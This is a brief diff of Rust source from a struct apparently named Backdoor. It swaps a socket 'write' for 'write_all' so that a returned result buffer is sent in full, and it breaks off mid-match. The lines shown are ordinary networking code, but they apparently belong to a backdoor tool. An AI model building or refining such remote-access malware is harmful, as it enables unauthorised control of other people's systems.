@@ -199,7 +199,7 @@ impl Backdoor
                         let mut ret_buffer = Vec::<u8>::new();
                         ret_buffer.extend_from_slice(ret.as_bytes());
 
-                        match stream.write(&ret_buffer)
+                        match stream.write_all(&ret_buffer)
                         {
                             Ok(_) => {},
                             Err(s) => 
